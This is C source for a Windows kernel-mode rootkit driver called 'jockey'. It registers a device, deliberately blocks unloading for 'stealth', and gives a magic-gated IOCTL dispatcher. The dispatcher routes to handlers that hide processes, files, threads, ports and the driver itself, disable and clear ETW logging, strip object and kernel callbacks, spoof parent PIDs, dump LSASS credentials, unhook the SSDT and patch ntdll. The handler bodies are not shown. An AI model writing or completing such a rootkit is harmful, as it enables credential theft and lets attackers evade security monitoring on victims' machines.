#include "jockey_common.h"

/*
 * jockey_km.c ??? Jockey Windows kernel driver entry and dispatch.
 *
 * DriverEntry creates \Device\Jockey and registers dispatch handlers.
 * All IOCTLs route through jockey_ioctl_dispatcher().
 */

#include "jockey.h"

/* ---- globals ---- */

PDEVICE_OBJECT g_jockey_device = NULL;
static UNICODE_STRING g_dev_name;
static UNICODE_STRING g_symlink;

/* ---- hidden lists ---- */

struct jky_hidden_pid   *g_hidden_pids = NULL;
struct jky_hidden_file  *g_hidden_files = NULL;
struct jky_hidden_thread *g_hidden_threads = NULL;

FAST_MUTEX g_list_lock;

/* ---- ObCallback registration ---- */

static PVOID g_ob_cookie = NULL;

/* ---- forward declarations ---- */

static NTSTATUS jockey_ioctl_dispatcher(PDEVICE_OBJECT dev, PIRP irp);
static NTSTATUS jockey_create_close(PDEVICE_OBJECT dev, PIRP irp);

/* ---- DriverEntry ---- */

NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)
{
    NTSTATUS status;
    USHORT i;

    UNREFERENCED_PARAMETER(reg_path);

    DbgPrint("[jockey] DriverEntry\n");

    /* Initialize the fast mutex for list protection */
    ExInitializeFastMutex(&g_list_lock);

    /* Create device */
    RtlInitUnicodeString(&g_dev_name, JKY_DEVICE_NAME);
    status = IoCreateDevice(driver, 0, &g_dev_name,
                            FILE_DEVICE_UNKNOWN, 0, FALSE, &g_jockey_device);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[jockey] IoCreateDevice failed: 0x%X\n", status);
        return status;
    }

    /* Create symbolic link */
    RtlInitUnicodeString(&g_symlink, JKY_SYMLINK_NAME);
    status = IoCreateSymbolicLink(&g_symlink, &g_dev_name);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[jockey] IoCreateSymbolicLink failed: 0x%X\n", status);
        IoDeleteDevice(g_jockey_device);
        return status;
    }

    /* Set dispatch routines */
    for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
        driver->MajorFunction[i] = jockey_create_close;

    driver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = jockey_ioctl_dispatcher;
    driver->DriverUnload = NULL; /* Don't unload ??? stealth */

    g_jockey_device->Flags |= DO_BUFFERED_IO;
    g_jockey_device->Flags &= ~DO_DEVICE_INITIALIZING;

    DbgPrint("[jockey] Driver loaded successfully\n");
    return STATUS_SUCCESS;
}

/* ---- Create / Close ---- */

static NTSTATUS jockey_create_close(PDEVICE_OBJECT dev, PIRP irp)
{
    UNREFERENCED_PARAMETER(dev);
    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

/* ---- IOCTL dispatcher ---- */

static NTSTATUS jockey_ioctl_dispatcher(PDEVICE_OBJECT dev, PIRP irp)
{
    PIO_STACK_LOCATION irp_sp = IoGetCurrentIrpStackLocation(irp);
    ULONG ctl_code = irp_sp->Parameters.DeviceIoControl.IoControlCode;
    ULONG in_len = irp_sp->Parameters.DeviceIoControl.InputBufferLength;
    ULONG out_len = irp_sp->Parameters.DeviceIoControl.OutputBufferLength;
    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
    uint32_t magic;

    UNREFERENCED_PARAMETER(dev);

    /* Verify magic on all requests */
    if (in_len < sizeof(uint32_t)) {
        status = STATUS_INVALID_PARAMETER;
        goto done;
    }

    magic = *(uint32_t *)irp->AssociatedIrp.SystemBuffer;
    if (magic != JKY_IOCTL_MAGIC) {
        status = STATUS_ACCESS_DENIED;
        goto done;
    }

    /* Route to handler */
    switch (ctl_code) {
    case JKY_IOCTL_PING:
        status = STATUS_SUCCESS;
        irp->IoStatus.Information = sizeof(uint32_t);
        *(uint32_t *)irp->AssociatedIrp.SystemBuffer = JKY_IOCTL_MAGIC;
        break;

    case JKY_IOCTL_HIDE_PID:
        status = jockey_ioctl_hide_pid(irp, in_len, out_len);
        break;

    case JKY_IOCTL_UNHIDE_PID:
        status = jockey_ioctl_unhide_pid(irp, in_len, out_len);
        break;

    case JKY_IOCTL_HIDE_FILE:
        status = jockey_ioctl_hide_file(irp, in_len, out_len);
        break;

    case JKY_IOCTL_UNHIDE_FILE:
        status = jockey_ioctl_unhide_file(irp, in_len, out_len);
        break;

    case JKY_IOCTL_GET_ROOT:
        status = jockey_ioctl_get_root(irp, in_len, out_len);
        break;

    case JKY_IOCTL_KILL_PID:
        status = jockey_ioctl_kill_pid(irp, in_len, out_len);
        break;

    case JKY_IOCTL_DISABLE_ETW:
        status = jockey_ioctl_disable_etw(irp, in_len, out_len);
        break;

    case JKY_IOCTL_DISABLE_OB_CB:
        status = jockey_ioctl_disable_ob_callbacks(irp, in_len, out_len);
        break;

    case JKY_IOCTL_HIDE_DRIVER:
        status = jockey_ioctl_hide_driver(irp, in_len, out_len);
        break;

    case JKY_IOCTL_PROTECT_MEM:
        status = jockey_ioctl_protect_mem(irp, in_len, out_len);
        break;

    case JKY_IOCTL_DISABLE_CALLBACKS:
        status = jockey_ioctl_disable_callbacks(irp, in_len, out_len);
        break;

    case JKY_IOCTL_HIDE_THREAD:
        status = jockey_ioctl_hide_thread(irp, in_len, out_len);
        break;

    case JKY_IOCTL_SPOOF_PPID:
        status = jockey_ioctl_spoof_ppid(irp, in_len, out_len);
        break;

    case JKY_IOCTL_CLEAR_ETW:
        status = jockey_ioctl_clear_etw(irp, in_len, out_len);
        break;

    case JKY_IOCTL_DUMP_LSASS:
        status = jockey_ioctl_dump_lsass(irp, in_len, out_len);
        break;

    case JKY_IOCTL_HIDE_PORT:
        status = jockey_ioctl_hide_port(irp, in_len, out_len);
        break;

    case JKY_IOCTL_PROCESS_SHIELD:
        status = jockey_ioctl_process_shield(irp, in_len, out_len);
        break;

    case JKY_IOCTL_UNHOOK_SSDT:
        status = jockey_ioctl_unhook_ssdt(irp, in_len, out_len);
        break;

    case JKY_IOCTL_PATCH_NTDLL:
        status = jockey_ioctl_patch_ntdll(irp, in_len, out_len);
        break;

    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

done:
    irp->IoStatus.Status = status;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return status;
}


